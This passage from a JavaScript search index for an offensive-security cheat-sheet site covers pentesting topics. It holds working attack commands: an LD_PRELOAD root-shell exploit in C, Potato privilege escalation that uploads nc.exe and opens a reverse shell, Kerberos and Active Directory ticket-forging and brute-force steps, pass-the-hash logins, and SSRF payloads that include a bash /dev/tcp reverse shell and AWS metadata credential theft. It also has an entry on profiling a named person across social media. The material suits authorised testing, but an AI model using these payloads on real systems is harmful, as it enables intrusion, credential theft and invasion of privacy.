                id:  82 ,
                href: "\/docs\/hdks\/linux\/management\/file-and-directory-permission-in-linux\/",
                title: "File \u0026 Directory Permission in Linux",
                description: "We can change permissions of file/directory using `chmod` command.",
                content: "Basic link Permission Number Character Read 4 r Write 2 w Execute 1 x We can use these value combination for changing permission.\nFor example,\nPermission Number Character Read + Write + Execute 4+2+1=7 rwx Read + Write 4+2=6 rw Read 4 r Cheat Sheet linkRead/Write/Execute link Target Command User chmod 700 sample.txt chmod u+rwx sample.txt Group chmod 070 sample.txt chmod g+rwx sample.txt Others chmod 007 sample.txt chmod o+rwx sample.txt All chmod 777 sample.txt chmod a+rwx sample.txt Read/Write link Target Command User chmod 600 sample.txt chmod u+rw sample.txt Group chmod 060 sample.txt chmod g+rw sample.txt Others chmod 006 sample.txt chmod o+rw sample.txt All chmod 666 sample.txt chmod a+rw sample.txt Read/Execute link Target Command User chmod 500 sample.txt chmod u+rx sample.txt Group chmod 050 sample.txt chmod g+rx sample.txt Others chmod 005 sample.txt chmod o+rx sample.txt All chmod 555 sample.txt chmod a+rx sample.txt Write/Execute link Target Command User chmod 300 sample.txt chmod u+wx sample.txt Group chmod 030 sample.txt chmod g+wx sample.txt Others chmod 003 sample.txt chmod o+wx sample.txt All chmod 333 sample.txt chmod a+wx sample.txt Set SUID/GUID linkBy adding SUID or GUID, we can execute the file as the file owner/group.\nThis may cause local privilege escalation.\n# SUID for user owner chmod u+s /opt/example.sh # GUID for group owner chmod g+s /opt/example.sh "
            }
        );
    index.add(
            {
                id:  83 ,
                href: "\/docs\/hdks\/reconnaissance\/google-dorks\/",
                title: "Google Dorks",
                description: "Google Dorks are Google searching techniques.",
                content: "Cache/Archive linkSearch the latest cached results.\ncache:examle.com Country \u0026 Language linkIf we want to get search results with specific country and language, set parameters gl and hl.\n# gl=us: United States # hl=en: English https://www.google.com/search?q=apple\u0026gl=us\u0026hl=en Directory Listing linkSearch websites which allow directory listings. We can retrieve all files if its enabled in websites.\nintext: \"Index of /admin\" intext: \"Index of /wp-admin\" site:example.com intext: \"Index of /admin\" File Types linkSpecify the filetype e.g. pdf`.\nfiletype:pdf filetype:pdf \"email address\" Sensitive Information link site:github.com \"DB_USER\" site:github.com \"DB_PASSWORD\" # Filter by datetime \"DB_USER\" after:2022-01-01 before:2023-01-01 Subdomains link site:*.google.com # -site: Exclude specific domain site:*.example.com -site:www.example.com # Specify file extension site:*.google.com ext:php Title linkSearche keywords contained in page title.\nintitle:pentesting URL linkSearch all URLs containing specific keyword e.g. TLD (com, eu, io, etc.).\ninurl:edu inurl:edu \"login\" "
            }
        );
    index.add(
            {
                id:  84 ,
                href: "\/docs\/hdks\/windows\/active-directory\/kerberos-pentesting\/",
                title: "Kerberos Pentesting",
                description: "An authentication protocol that is used to verify the identity of a user or host. It uses cryptography for authentication and is consisted of the client, the server, and the Key Distribution Center (KDC). A default port is 88. Kerberos also uses a 464 port for changing passwords.",
                content: "Enumeration linkTo enumerate automatically, you can use nmap.\nnmap --script krb5-enum-users --script-args krb5-enum-users.realm='example.local'-p 88 Brute Force Authentication linkKerbrute is a tool to perform Kerberos pre-auth bruteforcing.\nThe wordlist (e.g. combos.txt) specified must be the username:password combinations.\n# -v: verbose mode *it's recommended to add this flag otherwise we cannot confirm if the user exist or not. # --dc: domain controller # -d: domain # combos.txt: the wordlist specified must be combinations with \"username:password\". kerbrute bruteforce -v --dc 10.0.0.1 -d example.domain combos.txt # Users enumeration kerbrute userenum -v --dc 10.0.0.1 -d example.domain usernames.txt # Brute force user's password kerbture bruteuser -v --dc 10.0.0.1 -d example.domain passwords.txt username AS-REP Roasting linkWe might be able to find password hashes of user accounts that does not require preauthentication.\nPlease see AS-REP Roasting.\nKerberoasting Attack linkIf we have a password of some user, we might be able to gather another user credential.\nPlease see Kerberoasting Attack.\n"
            }
        );
    index.add(
            {
                id:  85 ,
                href: "\/docs\/hdks\/windows\/protocol\/msrpc-pentesting\/",
                title: "MSRPC (Microsoft Remote Procedure Call) Pentesting",
                description: "It is also known as a function call or a subroutine call. Default ports are 135, 593.",
                content: "Enumeration link nmap --script msrpc-enum -p 135 # rpcdump for dumping RPC endpoints impacket-rpcdump -port 135 # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol impacket-rpcdump -port 135 | grep -E 'MS-RPRN|MS-PAR' If we found MS-RPRN or MS-PAR, we might be able to exploit with PrintNightmare.\nMetasploit link msfconsole msf\u003e use auxiliary/scanner/dcerpc/endpoint_mapper msf\u003e use auxiliary/scanner/dcerpc/hidden msf\u003e use auxiliary/scanner/dcerpc/management msf\u003e use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor Investigation linkrpcinfo reports RPC information. If you dont have it, install rpcbind first to use the rpcinfo.\nsudo apt install rpcbind Run the following command.\nrpcinfo -p # NFS only rpcinfo -p | grep nfs Connect link # Anonymous logon rpcclient -N -U \"\" rpcclient -N -U \"\" -p 593 rpcclient -N -U \"\" dc.example.local # Specify username # -W: Workgroup # -N: No password rpcclient -U username rpcclient -W WORKGROUP -U username rpcclient -U username -N # -k: Kerberos authentication rpcclient -k Commands link # Server info rpcclient $\u003e srvinfo # Enumerate domains rpcclient $\u003e enumdomains # Enumerate domain users rpcclient $\u003e enumdomusers # Enumerate domain groups rpcclient $\u003e enumdomgroups # Domain info rpcclient $\u003e querydominfo # Current username rpcclient $\u003e getusername "
            }
        );
    index.add(
            {
                id:  86 ,
                href: "\/docs\/hdks\/reconnaissance\/person-investigation\/",
                title: "Person Investigation",
                description: "Accounts in Social Media \u0026 Other Platforms linkThe target person may use some social media. So first check if the account exists in each platform. Facebook GitHub Instagram Reddit Threads TikTok X (formerly Twitter) YoutTube Google Dorking linkAssume the target person named John Smith. john smith jsmith j.smith # add the year of birth john1999 For example, facebook jsmith reddit jsmith twitter jsmith IOSINT (Image OSINT) for Account Pictures linkIf the person sets the picture as user profile or posts, we can investigate the information about the image using IOSINT.",
                content: "Accounts in Social Media \u0026 Other Platforms linkThe target person may use some social media. So first check if the account exists in each platform.\nFacebook GitHub Instagram Reddit Threads TikTok X (formerly Twitter) YoutTube Google Dorking linkAssume the target person named John Smith.\njohn smith jsmith j.smith # add the year of birth john1999 For example,\nfacebook jsmith reddit jsmith twitter jsmith IOSINT (Image OSINT) for Account Pictures linkIf the person sets the picture as user profile or posts, we can investigate the information about the image using IOSINT.\nAlso, we might be able to get hints from information reflected a picture as below:\nBrand of clothes the person wears. Scenery reflected in the persons eye, cup, glass, etc. Numerical values such as dates reflected in a picture. Older Account Pages linkUsing WayBackMachine, we can gather older information about the target person in each platform.\nIn WayBackMachine, search the following URLs.\n# Reddit http://old.reddit.com/user/ https://www.reddit.com/user/ # Twitter https://twitter.com/ "
            }
        );
    index.add(
            {
                id:  87 ,
                href: "\/docs\/hdks\/reconnaissance\/port-scan\/",
                title: "Port Scan",
                description: "Port Scanning is a port mapping on the network. It is often executing when reconnaissance.",
                content: "Nmap linkNmap is still the most commonly used tool when scanning ports of the target system.\nBut in recent years, some other tools, such as masscan or rustscan, are also becoming popular because the tools scan faster than nmap.\nBasic Scan linkIts recommened to do as stealth scan (SYN scan) by adding the option -sS.\nAlso its prefered to add -T2 flag for being polite.\nsudo nmap -sS sudo nmap -sS -T2 # -V: OS version detection # -C: Default NSE sudo nmap -sSVC # -A: All detection sudo nmap -sS -A Skipping the host discovery\nsudo nmap -sS -Pn Scanning all ports.\nsudo nmap -sS -p- --min-rate 1000 sudo nmap -sS -p 1-65535 --min-rate 1000 Scanning the specific range ports.\nsudo nmap -sS -p 1000-1500 Scannning top ports.\nsudo nmap -sS --top-ports 100 First 1000 ports.\nsudo nmap -sS -p-1000 Wildcard IP link nmap 10.0.0.* CIDR (Classless Inter-Domain Routing) link nmap 10.0.0.1/24 UDP Scan linkSometimes you need the UDP scan.\nnmap -sU --top-ports 25 nmap -sU --top-ports 50 --open Other Scan Techniques linkFIN scan\n# FIN scan nmap -sF # Xmas scan nmap -sX Firewall Bypass link # Fragmented packets nmap -f # Specify MTU (Maximum Transmission Unit) nmap --mtu 16 nmap --mtu 24 # Decoy nmap -D RND:3 Nmap Scripting Engine (NSE) link nmap -sC nmap --script vuln Using Proxychains linkFirst start Tor service.\nsudo service tor start sudo service tor status To execute the nmap with proxychains, add the proxychains command before the nmap command.\nsudo proxychains nmap -sS Port Knocking linkPort knocking is a method of establishing a connection to a networked computer that has no open ports.\nfor i in ;do nmap -Pn -p $i --host-timeout 201 --max-retries 0 ;done # or we can use `curl` command for knocking ports. # -m: max time in seconds curl : -m 1 curl : -m 1 curl : -m 1 After that, check if ports opened.\nnmap Massscan linkMasscan is a TCP port scanner. It is faster than nmap.\nmasscan /16 masscan /24 # -p: Ports masscan /16 -p 80,443 masscan /16 -p 22-80 masscan /16 -p 0-65535 # --top-ports masscan /16 --top-ports 100 RustScan linkRustScan is the modern port scanner. It is faster than nmap.\n# -a: Addresses # --ulimit: Limit system resource amounts rustscan -a , --ulimit 5000 rustscan -a 'hosts.txt' --ulimit 5000 # CIDR rustscan -a 192.168.0.0/30 # -p: Ports rustscan -a -p 22,80 We can also use the Nmap arguments as below.\nrustscan -a -- -sS -A "
            }
        );
    index.add(
            {
                id:  88 ,
                href: "\/docs\/hdks\/linux\/privilege-escalation\/sudo\/sudo-privilege-escalation-by-overriding-shared-library\/",
                title: "Sudo Privilege Escalation by Overriding Shared Library",
                description: "LD_PRELOAD and LD_LIBRARY_PATH might be vulnerable to privilege escalation (PrivEsc).",
                content: "LD_PRELOAD, LD_LIBRARY_PATH Overwriting linkInvestigation linkCheck sudo commands.\nsudo -l The below is the output example.\nenv_keep+=LD_PRELOAD (ALL : ALL) NOPASSWD: somecmd If we find the sudo command keeps LD_PRELOAD environment, we can overwrite this variable to load our custome shared object and escalate the privileges.\nAlso, we can replace the LD_PRELOAD with LD_LIBRARY_PATH.\nBy the way, to list shared libraries required by the executable, use ldd command.\nldd somecmd Exploitation linkFirst off, create exploit.c under /tmp .\n#include #include #include void inject()__attribute__((constructor)); void inject() { unsetenv(\"LD_PRELOAD\"); setuid(0); setgid(0); system(\"/bin/bash\"); } The constructor attribute is a special type of function attribute in GCC. It tells the compiler to automatically call the function before the main function. Now compile the c program to shared object.\n# -fPIC: Generate Position Independent Code. # -shared: Generate a shared library. # -o: Output shared object. gcc -fPIC -shared -o exploit.so exploit.c We can execute command with setting the shared library to LD_PRELOAD variable then spawn the root shell.\nsudo LD_PRELOAD=/tmp/exploit.so somecmd "
            }
        );
    index.add(
            {
                id:  89 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-localpotato\/",
                title: "Windows PrivEsc with LocalPotato",
                description: "GodPotato linkRequired Privileges link SeImpersonatePrivilege Payloads link https://github.com/BeichenDream/GodPotato GodPotato -cmd \"cmd /c whoami\" JuicyPotato linkRequired Privilege link SeImpersonatePrivilege or SeAssignPrimaryToken Payloads link https://github.com/antonioCoco/JuicyPotatoNG https://github.com/ohpe/juicy-potato Before exploiting, we need to upload nc.exe (it is available from here) to the target machine.\nInvoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\\Temp\\nc.exe Next start a listener in local machine.\nnc -lvnp 4444 Then execute JuicyPotato in target machine.\nJuicyPotatoNG.exe -t * -p \"c:\\Temp\\nc.exe\" -a \"10.0.0.1 4444 -e cmd.",
                content: "GodPotato linkRequired Privileges link SeImpersonatePrivilege Payloads link https://github.com/BeichenDream/GodPotato GodPotato -cmd \"cmd /c whoami\" JuicyPotato linkRequired Privilege link SeImpersonatePrivilege or SeAssignPrimaryToken Payloads link https://github.com/antonioCoco/JuicyPotatoNG https://github.com/ohpe/juicy-potato Before exploiting, we need to upload nc.exe (it is available from here) to the target machine.\nInvoke-WebRequest -Uri http://10.0.0.1:8000/nc.exe -OutFile c:\\Temp\\nc.exe Next start a listener in local machine.\nnc -lvnp 4444 Then execute JuicyPotato in target machine.\nJuicyPotatoNG.exe -t * -p \"c:\\Temp\\nc.exe\" -a \"10.0.0.1 4444 -e cmd.exe\" PrintSpoofer linkRequired Privilege link SeImpersonatePrivilege Payloads link https://github.com/dievus/printspoofer PrintSpoofer.exe -i -c cmd RoguePotato linkRequired Privilege link SeImpersonatePrivilege Payloads link https://github.com/antonioCoco/RoguePotato RottenPotato linkRequired Privilege link SeImpersonatePrivilege Payloads link https://github.com/breenmachine/RottenPotatoNG "
            }
        );
    index.add(
            {
                id:  90 ,
                href: "\/docs\/hdks\/windows\/active-directory\/ad-cs-pentesting\/",
                title: "AD CS (Active Directory Certificate Services) Pentesting",
                description: "AD CS is Public Key Infrastructure (PKI) implementation. The misconfiguration of certificate templates can be vulnerable to privilege escalation.",
                content: "Enumeration linkWe can retrieve certificates information on target Windows machine using certutil.\n# Dump general information certutil -dump # Dump information about certificate authority certutil -ca certutil -catemplates # List all templates certutil -template # specify the template certutil -template ExampleTemplate Then check if Allow Full Control or Allow Write include the group which current user belongs to. If so, we can modify the template and might be able to escalate privilege.\nExisting Certificates link Get-ChildItem cert:\\ Get-ChildItem cert:\\CurrentUser\\ Get-ChildItem cert:\\CurrentUser\\My Get-ChildItem cert:\\LocalMachine\\ Get-ChildItem cert:\\LocalMachine\\My Extract Certificates link $cert = Get-ChildItem -Path cert:\\CurrentUser\\My\\ Export-Certificate -Cert $cert -FilePath c:\\Users\\\\Desktop\\user.cer Extract the Private Key from a Certificate link $pw = ConvertTo-SecureString \"password123\" -AsPlainText -Force $certificate = Get-ChildItem -Path cert:\\CurrentUser\\My\\ Export-PfxCertificate -Cert $certificate -FilePath user.pfx -Password $pw "
            }
        );
    index.add(
            {
                id:  91 ,
                href: "\/docs\/hdks\/windows\/active-directory\/bloodhound-sharphound\/",
                title: "BloodHound SharpHound for Active Directory",
                description: "BloodHound is a web application to reveal the hidden and intended relationships within an Active Directory. SharpHound is a C# data collector for BloodHound.",
                content: "Enumerate Active Directory link1. Collect Information with Sharphound linkIn target machine, download SharpHound and run.\n# Enumerate the AD information that can be visualized in Bloodhound Sharphound.exe --CollectionMethods All --Domain dc.example.com --ExcludeDCs Then the zip file will be generated. This file can be displayed in Bloodhound.\nTo transfer the zip file to local machine, run the following command in local machine.\nscp @example.com:C:/Path/To/.zip . 2. Start Bloodhound linkIn local machine, start neo4j console.\nsudo neo4j console After that, in another terminal, start Bloodhound.\nbloodhound --no-sandbox This shows the authentication GUI. The default credential is:\nneo4j:neo4j However, we may need to change the neo4j password via http://localhost:7474/.\n3. Visualize a ZIP File linkIn Bloodhound, drag and drop the zip file which we transferd in the previous section.\nJson files will be imported.\n4. Attack Paths linkAfter importing, we can view the several attack paths. Click the three stripe icon on the top-left of the window.\n"
            }
        );
    index.add(
            {
                id:  92 ,
                href: "\/docs\/hdks\/windows\/active-directory\/dacl-attack\/",
                title: "DACL (Discretionary Access Control List) Attack",
                description: "DACL is a list of the trustees that are allowed or denied access to objects in Active Directory.",
                content: "Add Rights linkWe may be able to take a full control of securable objects by getting GenericAll permission on OU (Organizational Unit).\n1. Ask TGT for Kerberos Authentication linkIf we want to use Kerberos authentication for attacking DACL, we need to retrieve a TGT for specific user at first. In addition, to avoid authentication error, we need to synchronize the system time with the domain controller using ntpdate or rdate.\nsudo ntpdate example.local # or sudo rdate -n example.local impacket-getTGT -dc-ip dc.example.local example.local/username:password The getTGT above dumps a .ccache file which stores TGT.\nAfter dumping the .ccache file, set it to an environment variable for using the later processing.\nexport KRB5CCNAME=username.ccache 2. Read DACL linkWe can use Impackets dacledit which has not yet been merged as of 2023/10/21.\nThe repository is here: https://github.com/ShutdownRepo/impacket/tree/dacledit\ndacledit.py -action read -target TestGroup -principal username -dc-ip 10.0.0.1 example.local/username:password # -use-ldaps: Use LDAPS instead of LDAP # -k: Use Kerberos authentication dacledit.py -action read -target TestGroup -principal username -dc-ip 10.0.0.1 example.local/username:password -use-ldaps -k 3. Write DACL link dacledit.py -action write -rights 'FullControl' -principal username -target-dn'OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL' -inheritance -dc-ip dc.example.local example.local/username:password -use-ldaps -k # -use-ldaps: Use LDAPS instead of LDAP # -k: Use Kerberos authentication dacledit.py -action write -rights 'FullControl' -principal username -target-dn'OU=SERVICE USERS,DC=EXAMPLE,DC=LOCAL' -inheritance -dc-ip dc.example.local example.local/username:password -use-ldaps -k "
            }
        );
    index.add(
            {
                id:  93 ,
                href: "\/docs\/hdks\/windows\/active-directory\/pbcd-attack\/",
                title: "RBCD (Resource-Based Constrained Delegation) Attack",
                description: "Kerberos RBCD attack targets a domain computer, exactly service principals related to the target domain computer.",
                content: "Exploit linkReference: https://github.com/tothi/rbcd-attack#abusing-kerberos-resource-based-constrained-delegation\n0. Prerequisites linkTo achieve this attack successfully, we need the following conditions:\nA domain account who has permission to write the computer (msDS-AllowedToActOnBehalfOfOtherIdentity property of the domain object). A domain account who has permission to create a new computer. LDAP (389) and SAMR (445) or LDAPS (636) access to the DC. Kerberos (88) access to the DC. 1. Create Fake Computer link impacket-addcomputer -computer-name 'fakecomputer$' -computer-pass 'password' -dc-ip 10.0.0.1 example.local/username:password 2. Modify Delegation Rights linkWe can use rbcd.py for abusing msDS-AllowedToActOnBehalfOfOtherIdentity property of the target.\nrbcd.py -f FAKECOMPUTER -t WEB -dc-ip 10.0.0.1 example\\\\username:password rbcd.py 'example.local/fakecomputer$' -delegate-to 'fakecomputer$' -delegate-from user1 -action write -use-ldaps -k -no-pass 3. Get the Impersonated Service Ticket linkImpersonated service tickets may allow high-level access to services on the target like CIFS (Common Internet File System), HTTPs, etc.\ngetST.py -spn cifs/example.local -impersonate admin -dc-ip 10.0.0.1 example.local/FAKECOMPUTER$:password After getting a service ticket, reveal it to retrieve credentials.\nexport KRB5CCNAME=`pwd`/admin.ccache klist "
            }
        );
    index.add(
            {
                id:  94 ,
                href: "\/docs\/hdks\/windows\/privilege-escalation\/windows-privesc-with-kerberos\/",
                title: "Windows PrivEsc with Kerberos",
                description: "Privilege Escalation linkFirst off, download two PS scripts in local machine..\nwget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 Then upload them to the target machine.\n# Evil-WinRM upload PowerView.ps1 Import-Module .\\PowerView.ps1 upload Powermad.ps1 Import-Module .\\Powermad.ps1 1. Check Users Permission and Windows Versions linkCheck if users are allowed to create a new computer object on the domain.\nGet-DomainObject -Identity \"dc=example,dc=com\" -Domain example.com # ------------------------- # Result ms-ds-machineaccountquota: 10 And check if the machine is at least Windows Server 2012.",
                content: "Privilege Escalation linkFirst off, download two PS scripts in local machine..\nwget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 wget https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1 Then upload them to the target machine.\n# Evil-WinRM upload PowerView.ps1 Import-Module .\\PowerView.ps1 upload Powermad.ps1 Import-Module .\\Powermad.ps1 1. Check Users Permission and Windows Versions linkCheck if users are allowed to create a new computer object on the domain.\nGet-DomainObject -Identity \"dc=example,dc=com\" -Domain example.com # ------------------------- # Result ms-ds-machineaccountquota: 10 And check if the machine is at least Windows Server 2012.\nGet-DomainController # ------------------------- # Result OSVersion: Windows Server 2022 Standard Additionally, check if the target computer does not have the attributes msds-allowedtoactionbehalfofotheridentity set.\nhostname Get-NetComputer | Select-Object -Property name, msds-allowedtoactionbehalfofotheridentity # ------------------ # Result name msds-allowedtoactionbehalfofotheridentity ---- ---------------------------------------- {1, 0, 4, 128...} 2. Create a New Computer linkNow you can create a new computer object.\nNew-MachineAccount -MachineAccount TEST01 -Password $(ConvertTo-SecureString '12345' -AsPlainText -Force) Get-DomainComputer test01 # ---------------------- # Result (copy the id) objectsid: S-1-5-21-1677581083-3380853377-188903654-5103 Create a new raw security descriptor.\n# Paste the objectsid which was copied in previous section. $objectsid = \"S-1-5-21-1677581083-3380853377-188903654-5103\" $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$objectsid)\" $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer $(hostname) | Set-DomainObject -Set @{'msds-allowedtoactionbehalfofotheridentity'=$SDBytes} -Verbose 3. Impersonate to Get a Ticket linkDownload Rubeus.exe in local machine.\nwget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe Then upload it to the target machine and generate a RC4 hash.\n# Evil-WinRM upload Rubeus.exe .\\Rubeus.exe hash /password:12345 /user:test01 /domain:example.com # ------------------------- # Result (copy the rc4 hash) rc4_hmac: 32ED87BDB5FDC5E9CBA88547376818D4 We can request a Kerberos ticket for a new machine account while impersonating an administrator.\n.\\Rubeus.exe s4u /user:test01$ /rc4: /impersonateuser:administrator /msdsspn:cifs/.example.com /ptt # -------------- # Result (copy the output long hash at the last) Then generate a ticket (.kirbi).\n[IO.File]::WriteAllBytes(\"C:\\Users\\\\Documents\\ticket.kirbi\", [Convert]::FromBase64String(\"\")) download ticket.kirbi 4. Make the Ticket Usable and Use It linkDownload ticket_converter.py.\nwget https://raw.githubusercontent.com/zer1t0/ticket_converter/master/ticket_converter.py Destroy any tickets in local machine, and convert the ticket to Linux usable, then set the new tickets path.\nkdestroy python3 ticket_converter.py ticket.kirbi ticket.ccache export KRB5CCNAME=ticket.ccache We can use the ticket to get a shell.\nimpacket-wmiexec example.com/administrator@.example.com -no-pass -k "
            }
        );
    index.add(
            {
                id:  95 ,
                href: "\/docs\/hdks\/windows\/protocol\/winrm-pentesting\/",
                title: "WinRM (Windows Remote Management) Pentesting",
                description: "The Microsoft implementation of WS-Management Protocol which provides a common way for systems to access and exchange management information across an IT infrastructure. Default ports are 5985 (HTTP), 5986 (HTTPS), and also used 47001.",
                content: "Enumeration linkBrute Force Credentials link # CrackMapExec poetry run crackmapexec winrm -d DomainName -u usernames.txt -p passwords.txt # Metasploit msfconsole msf \u003e use auxiliary/scanner/winrm/winrm_login Evil-WinRM linkEvil-WinRM is a Windows Remote Management shell for pentesting.\nBelow are list of commands for each situation.\nConnect link evil-winrm -i -u username -p password # -P: Specifify port evil-winrm -i -P 5986 -u username -p password # Pass The Hash (-H) evil-winrm -i -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc # PowerShell Local Path (-s) evil-winrm -i -u username -p password -s /opt/scripts # SSL enabled (-S) evil-winrm -i -u username -p password -S If you have private key and public key, you can use them for authentication.\n# -S: SSL # -k: private key # -c: public key evil-winrm -i -S -k private.key -c public.key Commands linkAfter connecting, we can use a lot of useful commands to exploit.\nNote that we need to specify the absolute path for uploading and downloading.\n# Upload a local file to Windows machine PS\u003e upload ./example.bat c:\\\\Users\\Administrator\\Desktop\\exploit.bat # Download a file to local PS\u003e download c:\\\\Users\\Administrator\\Desktop\\example.txt ./example.txt # List all services PS\u003e services CrackMapExec linkCrackMapExec is a swiss army knife for pentesting networks.\nThe official docs says that its recommended to use it via Poetry which is a Python package manager.\nFirst off, move to the directory in which the CrackMapExec installed and run poetry install.\ncd crackmapexec poetry install Then execute with poetry run.\n# Login and CMD execution (-x) poetry run crackmapexec winrm -d DomainName -u username -p password -x 'whoami' # Login and PowerShell execution (-X) poetry run crackmapexec winrm -d DomainName -u username -p password -X '$PSVersionTable' # Pass the Hash and CMD execution (-x) poetry run crackmapexec winrm -d DomainName -u username -H -x 'whoami' # Pass the Hash and PowerShell execution (-X) poetry run crackmapexec winrm -d DomainName -u username -H -X '$PSVersionTable' OMIGOD (CVE-2021-38647) linkOpen Management Infrastructure (OMI) is vulnerable to Remote Code Execution (RCE).\nThere are many PoC available, for instance:\nhttps://github.com/AlteredSecurity/CVE-2021-38647 https://github.com/horizon3ai/CVE-2021-38647 "
            }
        );
    index.add(
            {
                id:  96 ,
                href: "\/docs\/hdks\/web\/security-risk\/ssrf\/",
                title: "SSRF (Server-Side Request Forgery)",
                description: "SSRF is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessibleto the attacker. SSRF is an attack against a server.",
                content: "SSRF Capture Tools linkIf we want to capture incoming requests from target website/server, there is a lot of open-source tools available.\nNgrok linkhttps://ngrok.com/\nTo start ngrok server, run the following.\nngrok http 80 # Force http scheme (not https) ngrok http --scheme=http 8090 --host-header=localhost:8090 Then start your local web server for fetching requests forwarded from the ngrok server.\nsudo python3 -m http.server 80 # or python3 -m http.server 8090 After starting ngrok and local web server, we can use the URL such as https://abcd-12-3-45-678.ngrok-free.app.\nLocalhost.run linkhttp://localhost.run/\nAs mentioned the official documentation,\n# If you don't already have an SSH key, generate it first. ssh-keygen -t rsa # Port forwarding to your local 8080 port. ssh -R 80:localhost:8080 localhost.run After running the command above, copy generated URL such as abcdef123456789.lhr.life.\nRequests sent to this URL will be forwarded to your localhost:8080.\nLocalXpose linkLocalXpose is a reverse proxy that enables you to expose your localhost to the internet. To use it, we need to sign up and Access Token.\nLogin using Access Token. loclx account login Open browser to access GUI version. loclx Pastebin linkhttps://pastebin.com/\nAfter writing the content in there, we can easily use the raw page such as https://pastebin.com/raw/abcdefgh.\nInteractsh linkInteractsh\ninteractsh-client -v Other Tools link Webhook.site pingb.in Local Web Server linkAlso we can simply open local web server if local machine accepts external requests.\npython3 -m http.server 8000 HTTP (http://) linkWe may be able to use another server in the target machine.\nFor example, pass the localhost URL to the GET parameters.\nAlso These are available in POST params.\n# Localhost ?url=http://localhost/ ?url=http://127.0.0.1/ ?url=http://127.0.0.1:80/ ?url=http://127.0.0.1:3000/ ?url=http://127.0.0.1:8000/ ?url=http://127.0.0.1:8080/ ?url=http://0/ ?url=http://2130706433/ ?url=http://017700000001/ ?url=http://127.1/ ?url=http://127.0.0.1/test.php%00 ?url=http://127.0.0.1/test.php\\x00 # Backend URL (e.g. 192.168.0.x) ?url=http://192.168.0.23/ ?url=http://192.168.0.23:80/ ?url=http://192.168.0.23:3000/ ?url=http://192.168.0.23:8000/ ?url=http://192.168.0.23:8080/ # Server status ?url=http://localhost/server-status # At sign ?url=test@sub.example.com/index.php Local Port Enumeration linkWe can find which port is opening by fuzzing port number.\nseq 1 65535 | ffuf -u https://example.com/?url=http://127.0.0.1:FUZZ -w - Gopher (gopher://) linkWe may be able to use gopher:// scheme.\nAutomation linkWe can use Gopherus to create a payload automatically.\nSMTP linkAt first, we need to prepare a payload for sending message to victim user.\ngopher://127.0.0.1:25/_MAIL FROM: RCPT TO: DATA From:john@gofer.htb Subject:Test Hi, I'm not hacker. . The payload above can be URL encoded with tools such as CyberChef. Then the encoded payload is as follow.\ngopher://127.0.0.1:25/_MAIL%20FROM:%3Cjohn@example.com%3E%0ARCPT%20TO:%3Cmike@example.com%3E%0ADATA%0AFrom:john@gofer.htb%0ASubject:Test%0AHi,%20I'm%20not%20hacker.%0A. We can use it to SSRF.\n?url=gopher://127.0.0.1:25/_MAIL... Listen HTTP Request linkIf the website is vulnerable to SSRF, we can fetch sensitive information in HTTP request by sniffing.\nFirst off, start a listener in local machine.\nsudo nc -lvp 80 Then send request that is affected by SSRF.\nhttps://example.com/mail?server=http://evil.com See the HTTP request in local machine.\nWe might be able to fetch the sensitive data such as API key, Cookie, etc.\nOS Command Injection link ?url=http://127.0.0.1:3000/test;whoami ?url=http://127.0.0.1:3000/test;ping+-c+1+10.0.0.1 # Reverse Shell ?url=http://127.0.0.1:3000/;bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.1/4444 0\u003e\u00261\" Admin Operations linkWe may be able to operate significant stuff as the admin user via local server.\n# Localhost ?url=http://localhost/admin ?url=http://localhost/admin/delete?username=john ?url=http://127.1/%25%36%31dmin # Backend URL (e.g. 192.168.0.x) ?url=http://192.168.0.23/admin ?url=http://192.168.0.23/admin/delete?username=john Whitelisted URL Bypass linkIf the target website allows only the whitelisted URL, we can use them.\nAssume only example.com is allowed by the target website.\n?url=http://localhost@example.com/ ?url=http://localhost%25%32%33@example.com/ Open Redirect link key=/post/next?path=http://localhost/admin AWS Instances link ?url=http://169.254.169.254/latest/dynamic/instance-identity/ ?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance Hostname Bypass link1. Add Target Domain to /etc/hosts in Local Machine link x.x.x.x sub.example.com Restart the hostname service to apply the configuration imediately.\nsudo systemctl restart systemd-hostnamed 2. Access to the Domain We Specified** link https://example.com/?proxy=https://sub.example.com API Request linkWe might be able to get information from an API endpoint that is not accessible normally.\n?url=https://api.example.com/users ?url=https://api.example.com@internal-api.example.com/users Reveal Filtered Websites via Monitoring Tools (Webhook) linkSome web apps may have monitoring tools that check the health of external websites.\nYou may be able to reveal hidden contents of the target via the monitor.\nFirst off, create a redirect server using Python. Here its named redirect.py.\n#!/usr/bin/python3 import sys from http.server import HTTPServer, BaseHTTPRequestHandler class Redirect(BaseHTTPRequestHandler): def do_GET(self): self.send_response(302) self.send_header('Location', sys.argv[1]) self.end_headers() HTTPServer((\"0.0.0.0\", 8000), Redirect).serve_forever() After creating, run the following command.\nAssume that the filtered port is 3000 (nmap will reveal it).\npython3 redirect.py http://127.0.0.1:3000 And start listener for receiving the POST request of the webhook from the target website.\nnc -lvnp 4444 Now set the configuration of the webhook. For example:\nPayload URL: http://:4444/ Monitored URL: http://:8000/ You can see the contents of the filtered app.\nRequest Splitting linkReference: https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/\nIt is the vulnerability of the Node.js http.get module, which allows attacker to insert HTTP headers and bodies by splitting request.\nFirst off, prepare HTTP headers and body as below:\nHTTP/1.1 POST /update HTTP1.1 Content-Length: 28 username=admin\u0026password=newpass GET Then manipulate it for sending to target.\n# 